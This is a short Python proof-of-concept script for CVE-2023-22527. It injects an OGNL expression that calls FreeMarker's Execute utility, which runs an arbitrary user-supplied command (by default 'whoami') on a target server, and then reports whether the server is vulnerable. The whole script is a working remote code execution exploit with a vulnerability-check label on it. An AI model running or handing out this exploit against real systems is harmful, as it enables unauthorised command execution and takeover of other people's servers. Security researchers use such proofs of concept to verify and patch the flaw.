import argparse
import requests
from string import Template
from requests.exceptions import RequestException

def request_poc(url: str, cmd: str) -> None:
    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        if not url.startswith('http'):
            url = 'http://' + url
        payload_start = "?label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd-Ret',(new+freemarker.template.utility.Execute())."
        payload_end = 'exec({"${name}"}))'
        ret = Template(payload_end).substitute(name=cmd)
        payload = url + payload_start + ret
        response = requests.post(url, headers=headers, data=payload, timeout=5)
        if response.status_code != 200:
            print(f'Network error: Status Code {response.status_code}')
        elif 'Cmd-Ret' in response.text:
            print(f'This page {url} includes CVE-2023-22527 Vulnerability')
        else:
            print(f'This page {url} does not include CVE-2023-22527 Vulnerability')
    except RequestException as e:
        print(f'Network error occurred: {e}')
    except Exception as e:
        print(f'An error occurred: {e}')

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description='Check parameters "url" and "cmd".')
    parser.add_argument('url', type=str, help='Target URL, such as "8.8.8.8".')
    parser.add_argument('-C', '--cmd', help='Command line, e.g., root$whoami.', default='whoami')
    return parser.parse_args()

def run() -> None:
    args = parse_arguments()
    request_poc(args.url, args.cmd)

if __name__ == '__main__':
    run()
